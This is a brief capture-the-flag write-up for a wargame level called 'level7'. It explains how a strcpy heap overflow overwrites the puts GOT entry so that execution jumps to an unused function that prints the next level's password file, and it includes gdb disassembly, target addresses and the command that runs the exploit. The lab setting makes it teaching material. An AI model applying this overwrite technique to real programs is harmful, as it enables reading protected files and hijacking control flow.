# level7

- The goal here is to go to the `m` func that is unused in the binary.

- The `m` func prints the value of `c` and the current timestamp.

- The `c` variable is read from the file `/home/user/level8/.pass` in the `main` func.

- The `main` func takes 2 arguments and copies them to the `argv1` and `argv2` variables.

- We can exploit a buffer overflow to override the plt of puts with the address of the `m` func with the help of strcpy

- We gonna override the pointer to `argv2` to point it to the puts plt

- ```gdb
  (gdb) disas main
  [...]
     0x080485f7 <+214>:	call   0x8048400 <puts@plt>
  [...]

  (gdb) disas 0x8048400
  Dump of assembler code for function puts@plt:
     0x08048400 <+0>:	jmp    *0x8049928
     0x08048406 <+6>:	push   $0x28
     0x0804840b <+11>:	jmp    0x80483a0
  End of assembler dump.

  (gdb) disas m
  Dump of assembler code for function m:
     0x080484f4 <+0>:	push   %ebp
     0x080484f5 <+1>:	mov    %esp,%ebp
     0x080484f7 <+3>:	sub    $0x18,%esp
     0x080484fa <+6>:	movl   $0x0,(%esp)
     0x08048501 <+13>:	call   0x80483d0 <time@plt>
     0x08048506 <+18>:	mov    $0x80486e0,%edx
     0x0804850b <+23>:	mov    %eax,0x8(%esp)
     0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
     0x08048517 <+35>:	mov    %edx,(%esp)
     0x0804851a <+38>:	call   0x80483b0 <printf@plt>
     0x0804851f <+43>:	leave
     0x08048520 <+44>:	ret
  End of assembler dump.
  ```

- ```sh
  ./level7 `python /tmp/level7.py 1` `python /tmp/level7.py 2`
  ```
